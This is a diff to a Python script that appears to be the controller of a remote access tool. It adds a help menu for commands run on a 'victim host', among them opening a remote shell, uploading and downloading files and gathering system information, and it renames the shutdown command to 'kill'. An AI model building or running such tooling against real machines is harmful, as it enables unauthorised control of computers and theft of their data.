@@ -3,6 +3,17 @@ from os import system, name
 
 # IP & port of the server
 
+def_commands = """
+    pwd         show current working directory
+    user        show the user of victim host
+    listdir     list every item in the current directory
+    sysinfo     show information about the victim system
+    kill        kill the client and server
+    shell       open a shell interface on victim
+    upload      upload a file
+    download    download a file
+    """
+
 def run_connection():
 
     simple_cmd = ["listdir", "user", "sysinfo", "pwd", "upload", "download", "shell", "clear"]
@@ -13,6 +24,9 @@ def run_connection():
     # establish connection
     client_connection = socket(AF_INET, SOCK_STREAM)
     client_connection.connect((server_ip, port))
+    response = client_connection.recv(2048).decode("utf-8")
+    #response = response.decode("utf-8")
+    print("connection established with", response)
 
     while True:
 
@@ -21,17 +35,9 @@ def run_connection():
 
         # check if there is any input, if not break
         if user_input == "help":
-            print ('''commands:
-            listdir
-            user
-            sysinfo
-            pwd
-            upload
-            download
-            shell
-            ''')
+            print (def_commands)
             continue
-        elif user_input == "exitserver":
+        elif user_input == "kill": # kills server and client
             client_connection.send(user_input.encode()[:2048])
             break
         elif user_input in simple_cmd:
